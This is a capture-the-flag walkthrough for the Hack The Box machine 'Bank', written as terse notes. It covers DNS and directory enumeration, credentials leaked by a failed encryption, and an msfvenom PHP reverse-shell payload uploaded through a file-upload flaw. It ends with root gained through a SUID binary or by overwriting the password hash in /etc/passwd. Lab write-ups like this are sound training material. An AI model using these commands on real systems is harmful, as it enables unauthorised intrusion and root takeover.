#### Enumeration
- Open Ports `port 22, 53,80`
- No information gathered from the DNS Server
- Virtual host is guessed `bank.htb` and added to the `/etc/hosts`
- `balance-transfer` directory enumerated
- One file varies in size and reveals valid creds due to `failed encryption`
- The creds are used to login to the `web-app`
- `File Upload` in support page
- Comment found in page source
```html
I added the file extension .htb to execute as php for debugging purposes only
```

#### Shell Obtain
##### Via Metasploit
```bash
msfvenom -p php/meterpreter/reverse_tcp lhost=<your-ip> lport=<listening port> -f raw > shell.htb
```
- Upload the shell.htb in the support page and navigate to /uploads dir to get executed

##### Unintended Way
- In `burp` the support.php contents can be viewed without authentication as it mis-handles redirections


#### Priv Esc
- On running the `emergency` binary, the user is escalated to root group and root shell is obtained



#### Commands:

**DNS port Poking**
```bash
nslookup
> SERVER 10.10.10.29
# ask for who is localhost 127.0.0.1 Possiblities might expose a new host
> 127.0.0.1
# reverse lookup
> 10.10.10.29
# guessing the host name and it responds
> bank.htb
```

**DNS Recon**
```bash
# gathers all the host from 127.0.0.0 - 127.0.0.255 in the name server 10.10.10.29
dnsrecon -r 127.0.0.0/24 -n 10.10.10.29
# some host file may be included in 127.0.1.0 - 127.0.1.255
# If the 24 is replaced wirth `127.0.0.0/16` range will be from 127.0.0.0 - 127.0.255.255, if 8, 3 octacs will be checked
dnsrecon -r 127.0.1.0/24 -n 10.10.10.29
# On the 10 subnet
dnsrecon -r 10.10.10.0/24 -n 10.10.10.29
```

**DNS Zone Transfer**

```bash
# zone transfer without specifing a domain
dig axfr @10.10.10.29
# zone transfer on specifying the domain
dig axfr bank.htb @10.10.10.29
```

**Directory Enumeration**
```bash
python3 dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -t 20 -u http://bank.htb
```

**Multiple files download and sorting**
```bash
# wget
# wgets all the files recursively
wget -r http://bank.htb/balance-transfer/
# sort
# obtains the no. of characters in each file and arranges in a decending order
wc -c *.acc | sort -nr 
```

**Find files with specific permission**
```bash
find / -perm -4000 -exec ls -la 2>/dev/null
```

**Editing passwd file**
```bash
- openssl passwd ippsec
<generated hash>
- vi /etc/passwd
# change the x field with the generated hash
root:asdasds:.......
- su  root
ippsec
```
